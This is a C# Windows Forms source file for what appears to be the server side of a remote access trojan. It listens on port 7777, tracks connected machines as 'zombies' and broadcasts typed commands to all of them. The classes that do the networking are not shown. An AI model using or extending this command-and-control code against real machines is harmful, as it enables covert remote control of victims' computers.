using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    public partial class ServerMainForm : Form
    {
        // Port that we will listen to connection on.
        private static int listenPort = 7777;

        private Listener listener;

        // Store active connection in a list
        private List<Zombie> zombies = new List<Zombie>();
        public ServerMainForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // start the connection listener on port, pass current zombies list
            listener = new Listener(this, zombies, listenPort);
            listener.Start();
        }

        private void sendButton_Click(object sender, EventArgs e)
        {
            foreach(Zombie z in zombies)
            {
                z.SendData(cmdTextbox.Text);
            }
        }

        public void Log(string s)
        {
            // this is needed for any method on the main form called from the zombie thread.
            if (InvokeRequired)
            {
                this.Invoke(new Action<string>(Log), new object[] { s });
                return;
            }

            // appends log data to the console, including time of logging
            console.AppendText("[ " + string.Format("{0:hh:mm:ss tt}", DateTime.Now) + " ] " + s + "\n");
            console.ScrollToCaret();
        }
    }
}
